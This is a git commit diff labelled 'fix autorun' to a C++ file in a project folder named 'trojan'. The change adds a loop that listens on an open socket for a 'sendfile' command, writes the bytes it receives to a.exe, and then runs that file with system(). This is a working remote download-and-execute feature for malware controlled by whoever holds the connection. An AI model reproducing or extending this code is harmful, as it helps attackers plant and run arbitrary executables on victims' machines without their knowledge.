d4d885698f1b1d3f366b1e425b7197ad7bab55ee
Brickgao <brickgao@gmail.com>
2013-11-27 17:41:48 +0800

    fix autorun

--- src/trojan/main.cpp
+++ src/trojan/main.cpp
@@ -32,11 +32,38 @@ int main() {
         char recvbuf[1024];
         DWORD        dwWrite;  
         BOOL         bRet;
+        char filename[] = "a.exe";
+        int command = -1;
         while(true) {
-            read = recv(client, recvbuf, 1024, 0);
-            if(read == -1)  break;
+            while(true) {
+                read = recv(client, recvbuf, 1024, 0);
+                if(read == 8 && \
+                   recvbuf[0] == 's' && recvbuf[1] == 'e' && \
+                   recvbuf[2] == 'n' && recvbuf[3] == 'd' && \
+                   recvbuf[4] == 'f' && recvbuf[5] == 'i' && \
+                   recvbuf[6] == 'l' && recvbuf[7] == 'e') {
+                    command = 1;
+                    break;
+                }
+            }
+            if(command == 1) {
+                HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, 0,\
+                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,0);
+                while(true) {
+                    read = recv(client, recvbuf, 1024, 0);
+                    if(recvbuf[0] == 'E' && recvbuf[1] == 'O' && \
+                       recvbuf[2] == 'F')
+                        break;
+                    bRet = WriteFile(hFile, recvbuf, read, &dwWrite, NULL);
+                    if(bRet == false) {
+                        printf("Write Buf ERROR!");
+                        break;
+                    }
+                }
+                CloseHandle(hFile);
+                system("a.exe");
+            }
         }
-        puts(recvbuf);
     }
     return 0;
 }
